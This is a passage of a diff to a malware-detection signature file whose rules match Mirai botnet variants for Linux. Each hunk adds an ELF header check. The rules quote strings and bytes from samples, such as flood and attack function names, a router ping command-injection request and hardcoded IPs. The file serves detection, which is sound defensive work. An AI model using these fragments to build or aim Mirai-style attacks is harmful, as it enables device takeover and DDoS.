         $x_1_1 = {f0 4f 2d e9 08 54 9f e5 08 34 9f e5 05 50 8f e0 03 40 95 e7 00 00 54 e3 83 df 4d e2 0b 00 00 1a f4 03 9f e5 19 1e 8d e2 00 00 85 e0 2c 02 00 eb 00 00 50 e3 d0 41 8d 15 e0 13 9f e5 d0 21 9d e5 01 30 95 e7 02 00 53 e1 01 20 85 17 02 01 00 1b}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4178,6 +4348,7 @@ rule Backdoor_Linux_Mirai_Bv_2147823565_0
         $x_1_6 = "Attackpid" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_5_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -4205,6 +4376,7 @@ rule Backdoor_Linux_Mirai_Ci_2147823566_0
         $x_1_4 = "9xsspnvgc8aj5pi7m28p" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_3_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -4230,6 +4402,7 @@ rule Backdoor_Linux_Mirai_CQ_2147824846_0
         $x_1_2 = {c0 9f e5 04 c0 2d e5 0c 00 9f e5 0c 30 9f e5 d3 43 00 ea fd 3d 00 eb 28 dc 01 00 f0 02 01 00 d4 80 00 00 f0 4f 2d e9 51 dc 4d e2 74 d0 4d e2 02 40 a0 e1 03}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -4253,6 +4426,7 @@ rule Backdoor_Linux_Mirai_CR_2147824847_0
         $x_1_3 = {00 80 e3 00 00 c4 e5 00 00 d4 e5 18 c0 9d e5 b0 00 c0 e3 00 50 a0 e3 40 00 80 e3 14 c0 8c e2 00 00 c4 e5 b2 c0 c4 e1 01 50 c4 e5 03 70 a0 e1 01}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -4274,6 +4448,7 @@ rule Backdoor_Linux_Mirai_CS_2147824848_0
         $x_1_1 = {00 b4 80 00 00 0d c0 a0 e1 10 d8 2d e9 04 b0 4c e2 24 d0 4d e2 18 00 0b e5 1c 10 0b e5 18 30 1b e5 00 30 d3 e5}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4297,6 +4472,7 @@ rule Backdoor_Linux_Mirai_CT_2147824861_0
         $x_1_3 = {04 e0 9d e4 1e ff 2f e1 ba 79 37 9e 3c 76 02 00 b9 79 37 9e 6c 00 9f e5 00 30 90 e5 01 30 83 e2 f0 41 2d e9 60 80 9f e5 03 ea a0 e1 2e ea a0 e1 0e 21 98 e7 49}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -4319,6 +4495,7 @@ rule Backdoor_Linux_Mirai_CU_2147824863_0
         $x_1_2 = {00 90 e5 0c 10 84 e2 80 20 a0 e3 47 25 00 eb 04 30 94 e5 e0 ff ff ea 10 40 2d e9 00 40 a0 e1}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -4341,6 +4518,7 @@ rule Backdoor_Linux_Mirai_CK_2147825027_0
         $x_1_2 = {00 40 a0 e3 01 0b 8d e2 08 00 80 e2 ?? ?? 00 eb 01 1b 8d e2 00 20 a0 e1 08 10 81 e2 06 00 a0 e1 01 40 84 e2 01 39 a0 e3 ?? ?? 00 eb 19 00 54 e3 f3 ff ff 1a 06 00 a0 e1 05 10 a0 e1 01 2b a0 e3 01 39 a0 e3 ?? ?? 00 eb 00 00 50 e3 eb ff ff 1a 06 00 a0 e1 ?? ?? 00 eb 6f ff ff ea}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4366,6 +4544,7 @@ rule Backdoor_Linux_Mirai_DG_2147825794_0
         $x_1_5 = "dsnctodtoeupeupeup" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -4392,6 +4571,7 @@ rule Backdoor_Linux_Mirai_DF_2147826630_0
         $x_1_6 = "hacktheworld1337" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4417,6 +4597,7 @@ rule Backdoor_Linux_Mirai_CI_2147826662_0
         $x_1_5 = {00 02 12 02 00 02 72 16 00 02 7a 15}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4439,6 +4620,7 @@ rule Backdoor_Linux_Mirai_X_2147827069_0
         $x_1_2 = {03 10 96 e7 5c 30 9d e5 00 00 52 e3 01 2a a0 03 01 00 73 e3 00 20 81 e5 09 00 00 1a dc 00 00 eb 00 40 a0 e1 f1 00 00 eb 00 00 54 e1 0e 00 00 1a 0e 01 00 eb 00 40 a0 e1 e7 00 00 eb 00 00 54 e1 09 00 00 1a}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -4461,6 +4643,7 @@ rule Backdoor_Linux_Mirai_BT_2147827140_0
         $x_1_2 = {31 c0 89 45 08 f0 83 0c 24 00 8b 44 24 10 05 e4 d0 04 08 8b 40 08 85 c0}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4482,6 +4665,7 @@ rule Backdoor_Linux_Mirai_BZ_2147827141_0
         $x_1_1 = {03 10 a0 e3 11 20 a0 e3 02 00 a0 e3 1a 10 00 eb 01 80 a0 e3 04 c0 a0 e3 00 10 a0 e3 03 20 a0 e3 0b 30 a0 e1 0a 00 84 e7 00 c0 8d e5 0c 40 84 e0 1c 80 8d e5 fe 0f 00 eb 01 00 70 e3 ed ff ff 1a 09 00 a0 e1 09 10 a0 e3 0e 0c 00 eb}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4506,6 +4690,7 @@ rule Backdoor_Linux_Mirai_CW_2147827455_0
         $x_1_4 = "{agczgbt|" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4529,6 +4714,7 @@ rule Backdoor_Linux_Mirai_CY_2147827456_0
         $x_1_3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4551,6 +4737,7 @@ rule Backdoor_Linux_Mirai_CX_2147827511_0
         $x_1_2 = {30 d2 e7 65 30 23 e2 00 30 c2 e7 01 20 82 e2 01 00 52 e1}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4577,6 +4764,7 @@ rule Backdoor_Linux_Mirai_BQ_2147827722_0
         $x_1_6 = "hkjmlona" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((5 of ($x_1_*))) or
             ((1 of ($x_2_*) and 3 of ($x_1_*))) or
@@ -4606,6 +4794,7 @@ rule Backdoor_Linux_Mirai_CK_2147827832_0
         $x_1_5 = {80 18 00 02 20 80 24 62 db 38 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -4628,6 +4817,7 @@ rule Backdoor_Linux_Mirai_CV_2147828187_0
         $x_1_2 = {8b 44 24 28 c7 44 24 04 02 00 00 00 89 44 24 08 8b 44 24 20 89 04 24 e8 72 8f 00 00 eb c6}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4652,6 +4842,7 @@ rule Backdoor_Linux_Mirai_DN_2147828188_0
         $x_1_4 = "TSource Engine Query" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4681,6 +4872,7 @@ rule Backdoor_Linux_Mirai_DN_2147828188_1
         $x_1_9 = "locker_set_mode" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4702,6 +4894,7 @@ rule Backdoor_Linux_Mirai_AR_2147828432_0
         $x_1_1 = {00 ea 04 30 dc e5 02 00 53 e1 08 c0 8c e2 06 00 00 0a 01 e0 8e e2 0e 00 50 e1 0c 10 a0 e1 f7 ff ff 1a 04 00 a0 e1 10 40 bd e8 1e ff 2f}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4726,6 +4919,7 @@ rule Backdoor_Linux_Mirai_CM_2147828580_0
         $x_1_4 = {00 18 8e 42 24 18 00 c2 af 05}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4749,6 +4943,7 @@ rule Backdoor_Linux_Mirai_CN_2147828986_0
         $x_1_3 = {00 a4 8c 00 00 00 00 fb ff 80 10 00 00 00 00 ec}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4773,6 +4968,7 @@ rule Backdoor_Linux_Mirai_CO_2147828987_0
         $x_1_4 = {10 21 00 40 00 24 ff 90 10 20 24 40}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4799,6 +4995,7 @@ rule Backdoor_Linux_Mirai_CJ_2147829079_0
         $x_1_6 = {00 75 92 12 61 20 40 00 00 ac}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4822,6 +5019,7 @@ rule Backdoor_Linux_Mirai_CL_2147829082_0
         $x_1_3 = {4b df db 9b 4a eb cc 76 8f}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4844,6 +5042,7 @@ rule Backdoor_Linux_Mirai_CQ_2147830791_0
         $x_1_2 = {82 04 34 13 ff ff 14 40 00 37 26 32 00 14 8f}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4866,6 +5065,7 @@ rule Backdoor_Linux_Mirai_DD_2147832440_0
         $x_1_2 = {00 73 2f 05 61 ff 00 00 e2 60 2a 48 42 a7 48 78 00 02 2f 02 2f 03 45 f9 80 00 06 00 4e 92}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4893,6 +5093,7 @@ rule Backdoor_Linux_Mirai_DB_2147832483_0
         $x_1_7 = "init_killer" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -4916,6 +5117,7 @@ rule Backdoor_Linux_Mirai_DH_2147832627_0
         $x_1_3 = "ROCRYSYRC" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4941,6 +5143,7 @@ rule Backdoor_Linux_Mirai_DC_2147833473_0
         $x_1_5 = "flood_tcp_ack" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -4964,6 +5167,7 @@ rule Backdoor_Linux_Mirai_DE_2147837899_0
         $x_1_3 = "infected" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4989,6 +5193,7 @@ rule Backdoor_Linux_Mirai_DI_2147840267_0
         $x_1_5 = "spoofer_process_name" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -5012,6 +5217,7 @@ rule Backdoor_Linux_Mirai_DK_2147842819_0
         $x_1_3 = "ripper_attack" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_5_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -5037,6 +5243,7 @@ rule Backdoor_Linux_Mirai_DA_2147843278_0
         $x_1_2 = {ac 30 9f e5 18 40 80 e2 04 20 a0 e1 03 10 96 e7 0d 00 a0 e1 9c 30 9f e5 03 c0 96 e7 0f e0 a0 e1 1c ff 2f e1 00 80 e0 e3 04 00 a0 e1 88 30 9f e5 03 c0 96 e7 0f e0 a0 e1 1c ff 2f e1 00 40 97 e5 01 10 a0 e3 74 30 9f e5 0d 00 a0 e1 00 80 87 e5 03 c0 96 e7 0f e0 a0 e1 1c ff 2f e1 0c 00 97 e5}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5059,6 +5266,7 @@ rule Backdoor_Linux_Mirai_DL_2147844755_0
         $x_1_2 = {31 39 33 2e 34 32 2e 33 32 2e 31 37 35 00 00 00 2f}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5081,6 +5289,7 @@ rule Backdoor_Linux_Mirai_DM_2147844756_0
         $x_1_2 = {2e 73 68 73 74 72 74 61 62 00 2e 69 6e 69 74 00 2e 74 65 78 74 00 2e 66 69 6e 69 00 2e 72 6f 64 61 74 61 00 2e 63 74 6f 72 73 00 2e 64 74 6f 72 73 00 2e 64 61 74 61}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5102,6 +5311,7 @@ rule Backdoor_Linux_Mirai_DO_2147844882_0
         $x_1_1 = {02 51 20 21 ?? 62 00 00 ?? ?? ?? ?? 38 42 00 37 a0 62 00 00 24 63 00 01}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5125,6 +5335,7 @@ rule Backdoor_Linux_Mirai_DP_2147849354_0
         $x_1_3 = {7c 08 02 a6 94 21 ff f0 90 01 00 14 80 03 00 0c 2f 80 00 01 41 9e 00 2c 41 bd 00 10 2f 80 00 00 41 9e 00 50 48 00 00 14 2f 80 00 02 41 9e 00 54 2f 80 00 03 41 9e 00 6c 39 20 00 16 48 00 00 74}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5149,6 +5360,7 @@ rule Backdoor_Linux_Mirai_DJ_2147849384_0
         $x_1_4 = "/tmp/condinetwork" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5173,6 +5385,7 @@ rule Backdoor_Linux_Mirai_DQ_2147849775_0
         $x_1_4 = "POST /cgi-bin/luci/" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5194,6 +5407,7 @@ rule Backdoor_Linux_Mirai_DR_2147850539_0
         $x_1_1 = "oob,6-3#+Tjmgltp#MW#23-38#TLT57*#BssofTfaHjw,604-05#+HKWNO/#ojhf#Df`hl*#" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5216,6 +5430,7 @@ rule Backdoor_Linux_Mirai_DS_2147851372_0
         $x_1_2 = {42 33 55 57 59 6d 4e 4d 74 43 72 66 50 67 63 75 4b 7a 32 34 62 53 73 4c 78 37 41 58 51 4a 47 61 68 39 38 65 77 69 76 46 54 4f 45 52 64 5a 2f 6c 31 49 36 6e 6a 35 48 70 6b 79 56 30 6f 71 2e 00 00 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5238,6 +5453,7 @@ rule Backdoor_Linux_Mirai_DT_2147851373_0
         $x_1_2 = {10 21 30 42 ff ff af a2 10 c0 3c 02 08 08 34 42 08 08 24 03 01 00 af a2 00 30 8f a2 10 c0 a6 23 00 02 27 a3 00 3c a6 22 00 00 24 14 ff ff a4 e6 00 02 a6 06 00 01 af a3 10 cc af a4 10 d0 24 1e 00 05 12 74 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5262,6 +5478,7 @@ rule Backdoor_Linux_Mirai_DU_2147851374_0
         $x_1_4 = "attack_remove_id" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5287,6 +5504,7 @@ rule Backdoor_Linux_Mirai_DW_2147852377_0
         $x_1_5 = "TSource Engine Query" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_10_*) and 3 of ($x_1_*))) or
             ((2 of ($x_10_*))) or
@@ -5313,6 +5531,7 @@ rule Backdoor_Linux_Mirai_DV_2147852390_0
         $x_1_2 = {7b 36 3d 3a 7b 36 21 27 2d 36 3b 2c 74 3f 3d 38 38 74 79 6d 74 54 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5337,6 +5556,7 @@ rule Backdoor_Linux_Mirai_DX_2147852443_0
         $x_1_4 = "misc/watchdog" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_5_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -5363,6 +5583,7 @@ rule Backdoor_Linux_Mirai_DZ_2147852954_0
         $x_1_3 = "mnt/mtd/app/gui" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5387,6 +5608,7 @@ rule Backdoor_Linux_Mirai_EB_2147888608_0
         $x_1_4 = "/root/dvr_gui/" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5408,6 +5630,7 @@ rule Backdoor_Linux_Mirai_EC_2147889307_0
         $x_1_1 = {34 97 69 88 78 c0 00 00 34 82 63 82 00 00 00 00 34 84 76 83 77 86 75 8a 00 00 00 00 34 81 7f c8 00 00 00 00 34 97 69 88 78 c0 68 8a 77 71 34 72 63 6a 00 00 34 97 69 88 78 c0 75 8a 6f 38 6f 74 6b 00 00 00 68 88 78 8c 7e 9b 21 b4 00 00 00 00 2b d7 2b d7 2b df 2b df 00 00 00 00 35 94 74 00 34 8a 7a 97 68 00 00 00 34 83 7e 91 34 9a 69 8e 75 73 74 7a 00 00 00 00 49 d0 68 b7 6a d6 4f dd}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5429,6 +5652,7 @@ rule Backdoor_Linux_Mirai_ED_2147890021_0
         $x_1_1 = {00 38 f7 f1 29 04 a2 a6 db 3b 60 8d a0 6c 34 da b4 3a 80 f4 31 02 89 34 73 19 88 be 99 5f 98 0e 32 54 ae 03 d6 12 0f 27 80 42 05 de d8 5e b4 e0 a6 40 cd 53 f6 2e 9c 2a 07 36 5b fa 9f 7c f0 2e cb 1a 53 8d 95 7a 07 9f 4f 12 df a9 0f 66 40 d3 84}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5451,6 +5675,7 @@ rule Backdoor_Linux_Mirai_DY_2147890543_0
         $x_1_2 = {06 00 1c 3c ?? ?? 9c 27 21 e0 99 03 e0 ff bd 27 10 00 bc af 1c 00 bf af 18 00 bc af 01 00 11 04 00 00 00 00 06 00 1c 3c ?? ?? 9c 27 21 e0 9f 03 20 80 99 8f 00 00 00 00 dc 01 39 27 09 f8 20 03 00 00 00 00 10 00 bc 8f 00 00 00 00 01 00 11 04}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5475,6 +5700,7 @@ rule Backdoor_Linux_Mirai_EA_2147893577_0
         $x_1_4 = {00 50 a0 e3 7c c1 8e e5 05 1a 8d e2 05 2a 8d e2 51 cc 8d e2 80 51 8e e5 7c c0 8c e2 cc 10 81 e2 4c 20 82 e2 05 30 a0 e1 0a 00 a0 e1 00 c0 8d e5 49 fd ff eb 00 40 a0 e1 05 00 a0 e1 a6 fd ff eb 05 00 54 e1 44 00 8d e5 55 ff ff da 18 80 9d e5 34 50 8d e5}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5499,6 +5725,7 @@ rule Backdoor_Linux_Mirai_ES_2147894239_0
         $x_1_4 = "Committing Suicide" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5521,6 +5748,7 @@ rule Backdoor_Linux_Mirai_EG_2147897546_0
         $x_1_2 = {00 5b 56 61 70 65 42 6f 74 2f 4b 69 6c 6c 65 72 2f 45 58 45 5d 20 4b 69 6c 6c 65 64 20 70 72 6f 63 65 73 73 3a 20 25 73 2c 20 50 49 44 3a 20 25 64}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5544,6 +5772,7 @@ rule Backdoor_Linux_Mirai_EF_2147897547_0
         $x_1_3 = "urn:dial-multiscreen-org:service:dial:1" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5567,6 +5796,7 @@ rule Backdoor_Linux_Mirai_KL_2147899552_0
         $x_1_3 = {86 00 7f 54 82 00 60 04 80 a0 60 80 12 bf ff fd}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5590,6 +5820,7 @@ rule Backdoor_Linux_Mirai_EY_2147899553_0
         $x_1_3 = {48 89 df e8 aa 6f 01 00 a8 01 74 17 49 8d 4e 01 48 8b 44 24 28 42 88 14 30 49 89 ce 49 ff cf 75 df}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5611,6 +5842,7 @@ rule Backdoor_Linux_Mirai_EE_2147899648_0
         $x_1_1 = {00 c6 8f e2 15 ca 8c e2 60 fa bc e5 00 c6 8f e2 15 ca 8c e2 58 fa bc e5 00 c6 8f e2 15 ca 8c e2 50 fa bc e5 00 c6 8f e2 15 ca 8c e2 48 fa bc e5 00 c6 8f e2 15 ca 8c e2 40 fa bc e5 00 c6 8f e2 15 ca 8c e2 38 fa bc e5 00 c6 8f e2 15 ca 8c e2 30 fa bc e5 00 c6 8f e2 15 ca 8c e2 28 fa bc e5 00 c6 8f e2 15 ca 8c e2 20 fa bc e5 00 c6 8f e2 15 ca 8c e2 18 fa bc e5 00 c6 8f e2 15 ca 8c e2 10 fa bc e5 00 c6 8f e2 15 ca 8c e2 08 fa bc e5 00 c6 8f e2 15 ca 8c e2 00 fa bc e5 30 40 2d e9 5c 50 9f e5 00 30 d5 e5 00 00 53 e3 30 80 bd 18 50 40 9f e5 00 30 94 e5 00 20 93 e5 00 00 52 e3 07 00 00 0a 04 30 83 e2 00 30 84 e5 0f e0 a0 e1 02 f0 a0 e1 00 30 94 e5 00 20 93 e5 00 00 52 e3 f7 ff ff 1a}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5634,6 +5866,7 @@ rule Backdoor_Linux_Mirai_EJ_2147900999_0
         $x_1_3 = {2e 73 68 73 74 72 74 61 62 00 2e 69 6e 69 74 00 2e 74 65 78 74 00 2e 66 69 6e 69 00 2e 72 6f 64 61 74 61 00 2e 63 74 6f 72 73 00 2e 64 74 6f 72 73 00 2e 64 61 74 61}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5657,6 +5890,7 @@ rule Backdoor_Linux_Mirai_EI_2147901531_0
         $x_1_3 = {80 a0 7f ff 12 80 00 11 c4 07 bf dc 40 00 01 3b 01 00 00 00 40 00 01 19 a0 10 00 08 80 a4 00 08 12 80 00 15 90 10 20 00 40 00 01 24 01 00 00 00 40 00 01 02 a0 10 00 08 80 a4 00 08 12 80 00 0e 90 10 20 00 c4 07 bf dc 80 a0 bf ff}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5681,6 +5915,7 @@ rule Backdoor_Linux_Mirai_EZ_2147901585_0
         $x_1_4 = "/bin/busybox" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5703,6 +5938,7 @@ rule Backdoor_Linux_Mirai_EZ_2147901585_1
         $x_1_2 = {01 20 52 e2 58 50 9d e5 00 30 a0 03 01 30 a0 13 01 b0 8b e2 05 00 5b e1 00 30 a0 23 01 30 03 32 01 70 d4 e4 00 00 53 e3 01 70 cc e4}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5726,6 +5962,7 @@ rule Backdoor_Linux_Mirai_EM_2147901589_0
         $x_1_3 = {93 bf 00 00 7e a4 ab 78 38 a0 28 00 38 c0 40 00 80 7e 00 00 48 01 0a 71 2c 03 00 00 41 82 02 fc 2f 83 ff ff 40 9e ff dc}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5748,6 +5985,7 @@ rule Backdoor_Linux_Mirai_FA_2147901928_0
         $x_1_2 = "someoffdeeznuts" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5771,6 +6009,7 @@ rule Backdoor_Linux_Mirai_EH_2147901966_0
         $x_1_3 = {48 8d 3c 28 48 89 c3 e8 b9 02 00 00 85 c0 79 04 48 83 cb ff 5a 48 89 d8 5b 5d c3}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5793,6 +6032,7 @@ rule Backdoor_Linux_Mirai_EK_2147902389_0
         $x_2_2 = {7c 08 02 a6 94 21 ff f0 93 e1 00 0c 7c 7f 1b 78 90 01 00 14 88 03 00 00 38 60 00 01 2f 80 00 00 41 9e 00 1c 7f e9 fb 78}  //weight: 2, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5816,6 +6056,7 @@ rule Backdoor_Linux_Mirai_QA_2147902850_0
         $x_1_3 = {12 80 00 0a 11 00 00 65 c2 0f bf d8 c2 2f bf da c2 0f bf d9 c0 2f bf dc c2 2f bf db 82 10 20 30 c2 2f bf d9 c2 2f bf d8 92 10 20 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5840,6 +6081,7 @@ rule Backdoor_Linux_Mirai_EL_2147903137_0
         $x_1_4 = "99?*.`z.?\".u2.76v;**639;.354u\"2.76q\"76v;**639;.354u\"76a+gjtcv37;=?u-?8*vpupa+gjtbZ" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_10_*) and 1 of ($x_1_*))) or
             ((2 of ($x_10_*))) or
@@ -5867,6 +6109,7 @@ rule Backdoor_Linux_Mirai_QY_2147903272_0
         $x_1_3 = {86 10 20 00 80 a0 c0 0b 32 80 00 05 90 02 20 01 81 c3 e0 08 90 10 20 01 90 02 20 01}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5890,6 +6133,7 @@ rule Backdoor_Linux_Mirai_QZ_2147903273_0
         $x_1_3 = {e0 78 fc 13 02 b0 41 6a fc 1b 80 b0 e0 78 e0 78 f8 13 02 b0 61 6a f8 1b c0 b0 e0 78 e0 78 40 8a 4b 7a f0 f5}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
